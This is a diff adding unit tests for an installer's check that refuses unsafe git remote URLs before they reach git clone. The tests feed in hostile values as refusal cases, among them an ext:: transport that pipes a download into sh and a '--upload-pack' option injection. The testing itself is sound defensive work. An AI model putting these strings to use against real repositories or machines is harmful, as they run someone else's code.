@@ -255,5 +255,57 @@ class TestInstallPyRealRun(unittest.TestCase):
                           "a second install over the same target rewrote config.json")
 
 
+class TestOriginUrlIsAllowlisted(unittest.TestCase):
+    """Security review 2026-09-04, Major: remote.origin.url is read out of
+    git config and handed straight to `git clone`, `git ls-remote` and
+    `claude plugin marketplace add`. A clone can carry any string there, and
+    two shapes turn that into somebody else's code running on the machine of
+    whoever ran install.sh: git's `ext::` transport runs its argument as a
+    shell command, and a leading `-` is read as an option by whatever runs
+    next. Driven both ways: the shapes that must be refused, and the
+    ordinary remotes that must keep working."""
+
+    def setUp(self):
+        # Imported here rather than at module scope: every other case in this
+        # file drives install.py as a subprocess on purpose, and this is the
+        # only one that needs the function itself.
+        import importlib.util
+        spec = importlib.util.spec_from_file_location("_sbe_install",
+                                                      INSTALL_PY)
+        self.install = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(self.install)
+
+    def _refused(self, url):
+        ok, reason = self.install.check_origin_url(url)
+        self.assertFalse(ok, "%r was allowed through" % url)
+        self.assertTrue(reason, "a refusal with no reason is not a refusal")
+        return reason
+
+    def test_the_ext_transport_is_refused_and_the_reason_names_it(self):
+        reason = self._refused("ext::sh -c 'curl example.invalid | sh'")
+        self.assertIn("ext::", reason)
+
+    def test_a_leading_dash_is_refused_and_the_reason_says_why(self):
+        reason = self._refused("--upload-pack=/tmp/payload")
+        self.assertIn("option", reason)
+
+    def test_other_shapes_that_are_not_repository_addresses_are_refused(self):
+        for url in ("file:///etc", "ftp://host/repo.git", "",
+                    "../../elsewhere", "-"):
+            self._refused(url)
+
+    def test_the_ordinary_remotes_every_host_prints_are_allowed(self):
+        for url in ("https://github.com/owner/repo.git",
+                    "https://bitbucket.org/workspace/repo.git",
+                    "ssh://git@github.com/owner/repo.git",
+                    "git://host/repo.git",
+                    "git@github.com:owner/repo.git",
+                    "git@bitbucket.org:workspace/repo.git",
+                    "/Users/someone/checkouts/repo"):
+            ok, reason = self.install.check_origin_url(url)
+            self.assertTrue(ok, "%r was refused: %s" % (url, reason))
+            self.assertIsNone(reason)
+
+
 if __name__ == "__main__":
     unittest.main(verbosity=2)
